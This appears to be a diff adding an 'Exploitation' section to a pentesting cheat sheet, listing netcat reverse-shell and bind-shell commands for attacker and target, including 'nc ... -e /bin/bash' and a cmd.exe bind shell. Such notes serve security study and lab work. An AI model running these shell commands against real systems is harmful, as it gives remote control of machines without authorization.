@@ -26,4 +26,18 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20an
 
 ## Information Gathering:
 
-##
+## Exploitation:
+
+#### Netcat:
+Reverse Shell:
+```
+    A: nc -lnvp <port_number>
+
+    T: nc <local_ip> <port_number> -e /bin/bash
+```
+Bind Shell:
+```
+    T: nc -lnvp <port_number> -e "cmd.exe"
+
+    A: nc <local_ip> <port_number>
+```
